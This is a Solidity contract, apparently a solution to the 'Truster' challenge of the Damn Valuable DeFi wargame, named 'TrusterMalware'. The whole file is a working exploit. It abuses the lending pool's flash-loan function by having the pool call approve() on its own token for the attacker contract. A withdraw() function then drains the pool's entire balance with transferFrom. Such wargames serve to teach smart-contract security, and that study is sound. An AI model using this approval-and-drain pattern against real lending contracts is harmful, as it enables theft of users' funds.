// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";


contract TrusterMalware {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(TrusterLenderPool _pool) {
        pool = _pool;
        token = pool.token();
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this),
            token.balanceOf(address(pool))
        );

        pool.flashLoan(0, msg.sender, address(token), data);

    }

    function getData() public view returns (bytes memory) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this),
            token.balanceOf(address(pool))
        );

        return data;
    }

    function withdraw() external {
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
